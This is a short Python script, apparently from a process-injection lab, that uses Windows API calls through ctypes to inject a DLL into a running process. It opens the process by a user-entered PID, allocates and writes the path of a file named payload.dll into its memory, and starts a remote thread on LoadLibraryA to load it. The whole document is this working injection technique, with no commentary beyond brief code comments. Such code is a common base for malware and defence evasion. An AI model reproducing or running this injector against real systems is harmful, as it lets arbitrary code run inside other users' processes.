from ctypes import *
import sys

PROCESS_ALL_ACCESS = 0x001F0FFF
MEM_COMMIT_RESERVE = ( 0x1000 | 0x2000 )
PAGE_READWRITE     = 0x04
BYTES_WRITTEN      = c_int(0)
THREAD_ID          = c_ulong(0)

DLLPATH = 'C:\\Users\\IEUser\\Desktop\\process-injection\\payloads\\payload.dll'

PID = int(input("Enter PID to inject into: "))

# Get handle to process
hprocess = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, PID)
if not hprocess:
    print(WinError())
    sys.exit(0)

# Allocates space for DLL path string
baseaddr = windll.kernel32.VirtualAllocEx(hprocess, None, len(DLLPATH), MEM_COMMIT_RESERVE, PAGE_READWRITE)
print(WinError())

# Writes DLL path to that memory
windll.kernel32.WriteProcessMemory(hprocess, baseaddr, DLLPATH, len(DLLPATH), byref(BYTES_WRITTEN))
print(WinError())

# Gets a handle to kernel32.dll
hmodule = windll.kernel32.GetModuleHandleA("kernel32.dll")
# Resolve loadlibrary address
loadlibraryaddr = windll.kernel32.GetProcAddress(hmodule, "LoadLibraryA")

# Create remote thread to execute loadlibrary
if not windll.kernel32.CreateRemoteThread(hprocess, None, 0, loadlibraryaddr, baseaddr, 0, byref(THREAD_ID)):
    print(WinError())
    sys.exit(0)
print("Thread ID: 0x%08x" % THREAD_ID.value)
